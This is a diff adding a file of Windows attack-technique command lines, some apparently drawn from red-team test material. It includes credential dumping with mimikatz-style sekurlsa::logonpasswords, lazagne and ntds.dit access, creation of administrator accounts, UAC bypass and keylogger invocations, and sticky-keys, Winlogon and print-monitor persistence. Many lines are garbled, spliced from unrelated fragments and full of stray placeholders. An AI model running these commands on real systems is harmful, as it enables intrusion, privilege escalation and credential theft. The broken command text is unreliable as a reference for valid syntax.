@@ -1,0 +1,64 @@
+net user administrator /domain
+silentrunner.exe
+net user administrator
+net group % \users\ $ { user_name }
+wscript $ { vbs_script }
+lazagne.exe windows
+esentutl.exe /y $ { cor_profiler = `` administrators
+net localgroup administrators '' /add
+attrib +h $ { time } -l $ { /every : $ ( domain } ;
+sekurlsa : :logonpasswords
+bypassuac.exe
+net user administrator /domain
+net computername= = `` $ { filename_regex }
+net user administrator
+net user administrator administrator /domain
+select win32_processor select-object * /y
+`` 'image 'win32_perfformatteddata_perfos_system hklm : software\classes\clsid\ _.log .id $ profile
+rdrleakdiag.exe /p $ target = `` cor_enable_profiling = `` $ { command -name `` command '' '' ;
+rundll32 popcalc.dll , keylog
+cmdkey.exe /list
+python -c `` kerberos : :list os ; -i ; -i = $ { password } \windows\ntds\ntds.dit , ( ( $ ( set mainwindowtitle
+net localgroup administrators `` `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+bypassuac.exe $ { archive_file_name
+bitsadmin.exe /setnotifycmdline $ { bits_job_name }
+rundll32 popcalc.dll , keylog
+reg query `` 1 } /d $ { destination }
+get-keystrokes
+cmdkey.exe /list
+auditpol /set set text.encoding /set ] : :securityprotocol = ) /grant 'https : [ net.webclient ) .downloadstring ( ( [ net.securityprotocoltype ] : :tls12
+icacls c : :pth /user : psexecutionpolicypreference administrators : $ { driver_name }
+takeown /f % windir % \system32\osk.exe
+set programw6432= $ : { id objws = ( % \updater.exe
+reg.exe add `` hkey_current_user\control panel\desktop '' /v `` '' logon/logoff '' execution options\osk.exe '' -arguments $ consumerargs
+silentrunner.exe and $ ( `` hkcu : \users\ $ { shadow id you create }
+lazagne.exe windows
+reg query hklm\software\microsoft\powershell\1\shellids\microsoft.powershell
+reg add `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam nt\currentversion\winlogon\notify\atomicredteam '' /f
+net user user administrator
+net user administrator
+net group `` domain
+net user $ { impersonate_user } ; -u @ `` :logonpasswords
+net user administrator /domain
+tasklist
+net user administrator /domain
+copy $ /v : \programdata\microsoft\windows\start [ lsass ) .id c : \users\ $ { username } -w ntds.dit }
+vsiisexelauncher.exe -p $ { commnad }
+conhost.exe [ -classname win32_operatingsystem | | select-object /resume
+lazagne.exe windows
+copy domain /domain
+sc.exe create = `` '' `` keylog
+reg `` hklm\system\currentcontrolset\services\winsock2\parameters '' `` cor_profiler '' ' -class -user )
+remove-item -path $ { filename_regex }
+query user /server : # { keylog
+dir c : \users\
+bitsadmin.exe /setnotifycmdline $ { domain }
+reg add `` hklm\system\currentcontrolset\services\ '' `` $ env : \users\
+net user administrator /add
+net localgroup
+for ( `` '' select *
+$ filterargs
+rundll32 popcalc.dll , keylog
+create.save : :logonpasswords
+net user administrator
+net localgroup administrators `` cor_profiler '' ' /grant '' $ true -class team }
